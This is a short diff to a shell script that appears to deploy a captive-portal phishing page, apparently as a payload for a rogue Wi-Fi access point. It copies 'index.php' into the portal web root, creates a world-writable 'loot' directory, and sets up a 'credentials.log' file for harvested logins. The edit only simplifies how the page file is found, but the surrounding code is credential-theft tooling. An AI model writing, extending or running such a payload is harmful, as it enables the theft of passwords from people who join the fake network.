@@ -85,18 +85,14 @@ mkdir -p "$PORTAL_ROOT"
 mkdir -p "$LOOT_DIR"
 chmod 777 "$LOOT_DIR"
 
-# Look in payload dir first (on-device), then repo-relative path (development)
 if [ -f "$PAYLOAD_DIR/index.php" ]; then
-    PORTAL_SRC="$PAYLOAD_DIR/index.php"
-elif [ -f "$PAYLOAD_DIR/../../portal/index.php" ]; then
-    PORTAL_SRC="$PAYLOAD_DIR/../../portal/index.php"
+    cp "$PAYLOAD_DIR/index.php" "$PORTAL_ROOT/index.php"
+    chmod 644 "$PORTAL_ROOT/index.php"
+    LOG green "  Deployed index.php to $PORTAL_ROOT/"
 else
-    ERROR_DIALOG "index.php not found — copy portal/index.php to $PAYLOAD_DIR/"
+    ERROR_DIALOG "index.php not found in $PAYLOAD_DIR/"
     exit 1
 fi
-cp "$PORTAL_SRC" "$PORTAL_ROOT/index.php"
-chmod 644 "$PORTAL_ROOT/index.php"
-LOG green "  Deployed index.php to $PORTAL_ROOT/"
 
 # Initialize credentials log
 touch "$LOOT_DIR/credentials.log"
